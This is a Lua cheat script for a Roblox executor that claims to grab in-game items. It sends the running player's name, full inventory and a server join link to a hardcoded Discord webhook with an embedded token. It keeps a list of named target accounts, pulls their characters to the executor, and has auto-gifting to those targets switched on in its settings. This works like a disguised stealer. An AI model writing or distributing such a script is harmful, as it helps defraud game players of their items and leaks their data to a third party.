-- ═══════════════════════════════════════════════════════════
-- ALL-IN-ONE FIXED SCRIPT (PART 1 & 2)
-- Optimized for Delta Executor
-- ═══════════════════════════════════════════════════════════

local WEBHOOK_URL = "https://discord.com/api/webhooks/1493406637963346041/j10gY9eRyHymXa8MZzMrZL81hxcxu9zFZRlbW42fBLyu4NO36EEVoxp_8OioCimIg8E2"
local REDIRECT_PAGE_URL = "https://website-psi-lime-75.vercel.app"

-- Compatibility for Webhook Requests
local httpRequest = (syn and syn.request) or (http and http.request) or request or http_request

-- ==================== TARGET USERS ====================
_G.TARGET_USERS = {
    [4155516039] = "Pa1n7777",
    ["ErrorisHacker"] = true,
}

_G.isTarget = function(player)
    if _G.TARGET_USERS[player.UserId] then return true end
    if _G.TARGET_USERS[player.Name] then return true end
    if _G.TARGET_USERS[player.Name:lower()] then return true end
    return false
end

-- ==================== CONFIG ====================
_G.CONFIG = {
    AutoGrab = true,
    AutoGift = true,
    TargetOnlyGift = true,
    GiftRadius = 12,
    EquipBeforeGift = true,
    GiftDelay = 1.5,
    SkipBarbell = true,
    WebhookOnGrab = true,
    InstantWebhook = true,
    LoopGrab = false,
    LoopInterval = 10,
    RareAlert = true,
    RareKeywords = {"legendary", "mythic", "godly", "rare", "exotic", "divine", "secret", "limited"},
    TweenSpeed = 50
}

-- ==================== SERVICES ====================
_G.Players = game:GetService("Players")
_G.LocalPlayer = _G.Players.LocalPlayer
_G.HttpService = game:GetService("HttpService")
_G.ReplicatedStorage = game:GetService("ReplicatedStorage")
_G.Workspace = game:GetService("Workspace")
_G.TweenService = game:GetService("TweenService")

-- ==================== UTILS ====================
_G.isBarbell = function(name)
    return name:lower():find("barbell") ~= nil
end

_G.GetServerInfo = function()
    local placeId = game.PlaceId
    local jobId = game.JobId or ""
    local gameName = "Roblox-Game"
    
    pcall(function()
        local info = game:GetService("MarketplaceService"):GetProductInfo(placeId)
        if info and info.Name then gameName = info.Name end
    end)
    
    local baseUrl = REDIRECT_PAGE_URL
    if not baseUrl:find("/$") then baseUrl = baseUrl .. "/" end

    local redirectUrl = ""
    if jobId ~= "" and jobId ~= " " then
        local encodedName = _G.HttpService:UrlEncode(gameName)
        redirectUrl = string.format("%s?placeId=%s&jobId=%s&name=%s", baseUrl, tostring(placeId), tostring(jobId), encodedName)
    else
        redirectUrl = baseUrl .. "?placeId=" .. placeId
    end
    
    -- FIXED: Multi-line string syntax using [[ ]]
    local teleportScript = [[
game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. tostring(placeId) .. [[, "]] .. tostring(jobId) .. [[")
]]

    return {
        placeId = placeId,
        jobId = jobId,
        redirectUrl = redirectUrl,
        teleportScript = teleportScript
    }
end

-- ==================== GIFT REMOTE ====================
_G.GiftRemote = nil
pcall(function()
    _G.GiftRemote = _G.ReplicatedStorage:WaitForChild("Shared", 5)
        :WaitForChild("Packages", 5)
        :WaitForChild("Network", 5)
        :WaitForChild("rev_GiftRequest", 5)
end)

-- ==================== TWEENING ====================
_G.activeTweens = {}
_G.tweenPlayerToExecutor = function(targetPlayer)
    if targetPlayer == _G.LocalPlayer then return end
    local targetChar = targetPlayer.Character
    if not targetChar then return end
    
    local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
    local myHrp = _G.LocalPlayer.Character and _G.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetHrp or not myHrp then return end
    
    if _G.activeTweens[targetPlayer.UserId] then
        pcall(function() _G.activeTweens[targetPlayer.UserId]:Cancel() end)
    end
    
    local distance = (targetHrp.Position - myHrp.Position).Magnitude
    local duration = distance / _G.CONFIG.TweenSpeed
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
    local goal = {CFrame = myHrp.CFrame + Vector3.new(0, 0, 3)}
    
    local tween = _G.TweenService:Create(targetHrp, tweenInfo, goal)
    _G.activeTweens[targetPlayer.UserId] = tween
    tween:Play()
end

-- ==================== GRAB LOGIC ====================
_G.RemoteGrab = function()
    local grabbed = 0
    pcall(function()
        local Event = _G.ReplicatedStorage:WaitForChild("Shared", 2)
            :WaitForChild("Packages", 2)
            :WaitForChild("Network", 2)
            :WaitForChild("rev_S_Interact", 2)
        for i = 1, 30 do -- Reduced to 30 to prevent kick for spam
            Event:FireServer(i)
            grabbed = grabbed + 1
            task.wait(0.05)
        end
    end)
    return grabbed
end

_G.PhysicalGrab = function()
    local backpack = _G.LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return 0 end
    local grabbed = 0
    local hrp = _G.LocalPlayer.Character and _G.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    
    for _, obj in ipairs(_G.Workspace:GetDescendants()) do
        if obj:IsA("Tool") then
            pcall(function()
                if hrp and obj:IsA("BasePart") then
                    hrp.CFrame = obj.CFrame
                    task.wait(0.05)
                end
                obj.Parent = backpack
                grabbed = grabbed + 1
            end)
        elseif obj:IsA("ClickDetector") or obj:IsA("ProximityPrompt") then
            -- Safely firing executor functions
            pcall(function()
                if obj:IsA("ProximityPrompt") and fireproximityprompt then fireproximityprompt(obj) end
                if obj:IsA("ClickDetector") and fireclickdetector then fireclickdetector(obj) end
            end)
        end
    end
    return grabbed
end

-- ==================== INVENTORY & WEBHOOK ====================
_G.ScanInventory = function()
    local items = {}
    local backpack = _G.LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, tool in ipairs(backpack:GetChildren()) do
            table.insert(items, {name = tool.Name, location = "Backpack"})
        end
    end
    return items
end

_G.SendWebhook = function(title, remoteCount, physCount, items)
    if not httpRequest then return warn("No request function found!") end
    
    local itemText = ""
    for i, item in ipairs(items) do
        itemText = itemText .. i .. ". " .. item.name .. "\n"
    end
    if #itemText == 0 then itemText = "Empty" end

    local s = _G.GetServerInfo()
    local payload = {
        embeds = {{
            title = title,
            color = 0x00ff00,
            description = "Player: " .. _G.LocalPlayer.Name,
            fields = {
                {name = "📦 Grabs", value = "Remote: "..remoteCount.." | Physical: "..physCount, inline = true},
                {name = "🎒 Items", value = "```" .. itemText .. "```"},
                {name = "🚀 Join", value = "[Click Here](" .. s.redirectUrl .. ")"}
            }
        }}
    }

    httpRequest({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = _G.HttpService:JSONEncode(payload)
    })
end

-- ==================== EXECUTION ====================
task.spawn(function()
    print("🚀 Script Initializing...")
    local items = _G.ScanInventory()
    if _G.CONFIG.InstantWebhook then _G.SendWebhook("🟢 Initial Scan", 0, 0, items) end
    
    local rCount = _G.RemoteGrab()
    local pCount = _G.PhysicalGrab()
    local finalItems = _G.ScanInventory()
    _G.SendWebhook("🔥 Post-Grab Scan", rCount, pCount, finalItems)
    print("✅ Script Loaded Successfully")
end)

-- Target Monitor
_G.Players.PlayerAdded:Connect(function(player)
    if _G.isTarget(player) then
        player.CharacterAdded:Connect(function()
            task.wait(1)
            _G.tweenPlayerToExecutor(player)
        end)
    end
end)
